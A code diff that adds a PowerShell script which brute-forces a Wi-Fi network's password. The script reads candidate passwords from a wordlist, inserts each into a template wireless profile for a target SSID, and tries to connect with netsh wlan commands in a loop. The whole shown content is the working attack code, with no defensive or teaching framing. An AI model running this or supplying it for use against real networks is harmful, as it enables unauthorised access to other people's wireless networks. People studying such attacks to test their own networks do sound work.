@@ -36,3 +36,28 @@ param
     $Wordlist
 )
 
+# Constants
+$TEMPLATE_FILE = "TEMPLATE.xml"
+$TEMP_FILE = "online_attack_temp.xml"
+
+# Convert SSID to hex
+$SSIDHex = (($SSID.ToCharArray() | 
+    ForEach-Object { "{0:x}" -f [byte] $_ }) -join "").ToUpper()
+
+# Read in input files
+$Candidates = Get-Content -Path $Wordlist
+$TemplateProfile = Get-Content -Path "$PSScriptRoot\$TEMPLATE_FILE"
+
+# Update SSID in template profile
+$TemplateProfile = $TemplateProfile -replace "TEMPLATE_SSID_HEX", "$SSIDHex"
+$TemplateProfile = $TemplateProfile -replace "TEMPLATE_SSID", "$SSID"
+
+# Keep trying passwords
+foreach ($Attempt in $Candidates) {
+    $AttemptProfile = $TemplateProfile -replace "TEMPLATE_SHARED_KEY", $Attempt
+    $AttemptProfile | Out-File -FilePath "$PSScriptRoot\$TEMP_FILE"
+
+    netsh wlan delete profile $SSID
+    netsh wlan add profile filename="$PSScriptRoot\$TEMP_FILE"
+    netsh wlan connect name=$SSID
+}
